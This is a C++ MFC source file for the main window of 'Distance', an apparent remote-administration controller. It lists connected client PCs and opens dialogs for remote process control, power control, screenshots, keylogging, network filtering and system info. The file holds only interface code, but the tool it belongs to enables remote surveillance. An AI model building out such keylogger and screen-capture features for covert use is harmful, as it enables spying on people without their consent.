//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: MainDlg.cpp
// 
// Creator: 0xlay
// 
// Environment: User mode only
//
// Module: DistanceApp.exe
//
//------------------------------------------------------------------------------

#include "pch.hpp"
#include "Framework.hpp"
#include "App.hpp"
#include "MainDlg.hpp"
#include "SettingsDlg.hpp"
#include "ScreenshotDlg.hpp"
#include "ProcessManagerDlg.hpp"
#include "PowerManagerDlg.hpp"
#include "NetfilterDlg.hpp"
#include "KeyloggerDlg.hpp"
#include "SystemInfoDlg.hpp"
#include "Convert.hpp"
#include "afxdialogex.h"
#include <atomic>


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


namespace Distance
{

    ////////////////////////////////////////////////////////////////////////////
    //
    // Internal implementation
    //
    ////////////////////////////////////////////////////////////////////////////

    namespace _internal
    {

        void WaitableTimer(MainDlg& mainDlg)
        {
            while (mainDlg.isTimerRunning_.load())
            {
                if (WaitForSingleObject(mainDlg.timer_, mainDlg.MaxTimeoutInMS) == WAIT_OBJECT_0)
                {
                    mainDlg.addPcToList();
                }
                else
                {
                    mainDlg.isTimerRunning_.store(false);
                    MessageBoxW(
                        nullptr,
                        L"Failed to update list of PC! Please restart application!",
                        L"Distance error!",
                        MB_OK | MB_ICONERROR
                    );
                    break;
                }
            }
        }

    } // Distance::_internal



    ////////////////////////////////////////////////////////////////////////////
    //
    // The AboutDlg implementation
    //
    ////////////////////////////////////////////////////////////////////////////

    class AboutDlg : public CDialogEx
    {
    public:
        AboutDlg();

        // Dialog Data
#ifdef AFX_DESIGN_TIME
        enum { IDD = IDD_ABOUTBOX };
#endif

    private:
        void DoDataExchange(CDataExchange* pDX) override; // DDX/DDV support
        DECLARE_MESSAGE_MAP()
    };

    AboutDlg::AboutDlg() : CDialogEx(IDD_ABOUTBOX)
    { }

    void AboutDlg::DoDataExchange(CDataExchange* pDX)
    {
        CDialogEx::DoDataExchange(pDX);
    }

    BEGIN_MESSAGE_MAP(AboutDlg, CDialogEx)
    END_MESSAGE_MAP()



    ////////////////////////////////////////////////////////////////////////////
    //
    // The MainDlg implementation
    //
    ////////////////////////////////////////////////////////////////////////////

    MainDlg::MainDlg(
        std::shared_ptr<Distance::Network::DefaultTcpServer> server,
        Distance::Network::Message& msg,
        CWnd* pParent
    )
        : CDialogEx(IDD_DISTANCEAPP_DIALOG, pParent),
        server_(std::move(server)),
        message_(msg),
        counterPC_(0)
    {
        mainIcon_ = AfxGetApp()->LoadIcon(IDI_MAINICON);
    }

    MainDlg::~MainDlg()
    {
        isTimerRunning_.store(false);
        waitableThread_->join();
        CloseHandle(timer_);
    }

    void MainDlg::DoDataExchange(CDataExchange* pDX)
    {
        CDialogEx::DoDataExchange(pDX);
        DDX_Control(pDX, IDC_LIST_PC, listPC_);
    }

    BEGIN_MESSAGE_MAP(MainDlg, CDialogEx)
        ON_WM_SYSCOMMAND()
        ON_WM_PAINT()
        ON_WM_QUERYDRAGICON()
        ON_COMMAND(ID_HELP_ABOUT, &MainDlg::OnHelpAbout)
        ON_COMMAND(ID_SETTINGS, &MainDlg::OnSettings)
        ON_BN_CLICKED(IDC_BUTTON_PROCESS_MANAGER, &MainDlg::OnBnClickedButtonProcessManager)
        ON_BN_CLICKED(IDC_BUTTON_POWER_MANAGER, &MainDlg::OnBnClickedButtonPowerManager)
        ON_BN_CLICKED(IDC_BUTTON_SCREENSHOT, &MainDlg::OnBnClickedButtonScreenshot)
        ON_BN_CLICKED(IDC_BUTTON_KEYLOGGER, &MainDlg::OnBnClickedButtonKeylogger)
        ON_BN_CLICKED(IDC_BUTTON_NETFILTER, &MainDlg::OnBnClickedButtonNetfilter)
        ON_BN_CLICKED(IDC_BUTTON_SYSINFO, &MainDlg::OnBnClickedButtonSysinfo)
    END_MESSAGE_MAP()

    BOOL MainDlg::OnInitDialog()
    {
        CDialogEx::OnInitDialog();

        images_.Create(32, 32, ILC_COLOR, 0, 0);
        images_.Add(AfxGetApp()->LoadIcon(IDI_PC_ICON));
        listPC_.SetImageList(&images_, LVSIL_NORMAL);

        // IDM_ABOUTBOX must be in the system command range.
        ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
        ASSERT(IDM_ABOUTBOX < 0xF000);

        CMenu* pSysMenu = GetSystemMenu(FALSE);
        if (pSysMenu != nullptr)
        {
            CString strAboutMenu;
            BOOL bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
            ASSERT(bNameValid);
            if (!strAboutMenu.IsEmpty())
            {
                pSysMenu->AppendMenu(MF_SEPARATOR);
                pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
            }
        }

        //
        // Set the icon for this dialog.
        //
        SetIcon(mainIcon_, TRUE);  // Set big icon
        SetIcon(mainIcon_, FALSE); // Set small icon

        //
        // Create timer
        //
        timer_ = ::CreateWaitableTimerW(nullptr, FALSE, nullptr);
        if (!timer_)
        {
            return FALSE;
        }

        isTimerRunning_ = true;

        LARGE_INTEGER start = Distance::Utils::IntegerToLargeInteger(-(1 * 10'000'000));
        BOOL success = SetWaitableTimer(timer_, &start, PeriodInMS, nullptr, nullptr, FALSE);
        if (!success)
        {
            return FALSE;
        }

        waitableThread_ = std::make_unique<std::thread>(_internal::WaitableTimer, std::ref(*this));
        return TRUE;  // return TRUE  unless you set the focus to a control
    }

    void MainDlg::addPcToList()
    {
        std::lock_guard lock(mutex_);
        while (isTimerRunning_.load())
        {
            if (server_->clientsQuantity() > listPC_.GetItemCount())
            {
                xstar::tostringstream oss;
                oss << "PC" << counterPC_++;
                listPC_.InsertItem(
                    listPC_.GetItemCount() /*push back*/, 
                    oss.str().c_str(), 
                    0/*icon index*/
                );
                continue;
            }
            break;
        }
    }

    void MainDlg::removePcFromList()
    {
        std::lock_guard lock(mutex_);
        if (server_->clientsQuantity() && listPC_.GetSelectionMark() < server_->clientsQuantity())
        {
            auto sockets = server_->getSockets();
            sockets->erase(sockets->begin() + listPC_.GetSelectionMark());
            listPC_.DeleteItem(listPC_.GetSelectionMark());
            --counterPC_;
        }
    }

    void MainDlg::OnSysCommand(UINT nID, LPARAM lParam)
    {
        if ((nID & 0xFFF0) == IDM_ABOUTBOX)
        {
            AboutDlg dlgAbout;
            dlgAbout.DoModal();
        }
        else
        {
            CDialogEx::OnSysCommand(nID, lParam);
        }
    }

    void MainDlg::OnPaint()
    {
        if (IsIconic())
        {
            CPaintDC dc(this); // device context for painting

            SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

            // Center icon in client rectangle
            int cxIcon = GetSystemMetrics(SM_CXICON);
            int cyIcon = GetSystemMetrics(SM_CYICON);
            CRect rect;
            GetClientRect(&rect);
            int x = (rect.Width() - cxIcon + 1) / 2;
            int y = (rect.Height() - cyIcon + 1) / 2;

            // Draw the icon
            dc.DrawIcon(x, y, mainIcon_);
        }
        else
        {
            CDialogEx::OnPaint();
        }
    }

    HCURSOR MainDlg::OnQueryDragIcon()
    {
        return static_cast<HCURSOR>(mainIcon_);
    }

    void MainDlg::OnHelpAbout()
    {
        AboutDlg dlgAbout;
        dlgAbout.DoModal();
    }

    void MainDlg::OnSettings()
    {
        SettingsDlg dlgSettings;
        INT_PTR response = dlgSettings.DoModal();
        if (response == ID_SETTINGS_SAVE)
        {
            MessageBoxW(L"The settings were saved!");
        }
    }

    void MainDlg::OnBnClickedButtonProcessManager()
    {
        ProcessManagerDlg dlgProcessManager(server_, listPC_.GetSelectionMark());
        if (dlgProcessManager.DoModal() == FAILED_CONNECTION_TO_CLIENT)
        {
            removePcFromList();
        }
    }

    void MainDlg::OnBnClickedButtonPowerManager()
    {
        PowerManagerDlg dlgPowerManager(server_, listPC_.GetSelectionMark());
        if (dlgPowerManager.DoModal() == FAILED_CONNECTION_TO_CLIENT)
        {
            removePcFromList();
        }
    }

    void MainDlg::OnBnClickedButtonScreenshot()
    {
        ScreenshotDlg dlgScreenshot(server_, listPC_.GetSelectionMark());
        if (dlgScreenshot.DoModal() == FAILED_CONNECTION_TO_CLIENT)
        {
            removePcFromList();
        }
    }

    void MainDlg::OnBnClickedButtonKeylogger()
    {
        KeyloggerDlg dlgKeylogger(server_, listPC_.GetSelectionMark());
        if (dlgKeylogger.DoModal() == FAILED_CONNECTION_TO_CLIENT)
        {
            removePcFromList();
        }
    }

    void MainDlg::OnBnClickedButtonNetfilter()
    {
        NetfilterDlg dlgNetfilter(server_, listPC_.GetSelectionMark());
        if (dlgNetfilter.DoModal() == FAILED_CONNECTION_TO_CLIENT)
        {
            removePcFromList();
        }
    }

    void MainDlg::OnBnClickedButtonSysinfo()
    {
        SystemInfoDlg dlgSystemInfo(server_, listPC_.GetSelectionMark());
        if (dlgSystemInfo.DoModal() == FAILED_CONNECTION_TO_CLIENT)
        {
            removePcFromList();
        }
    }

} // Distance
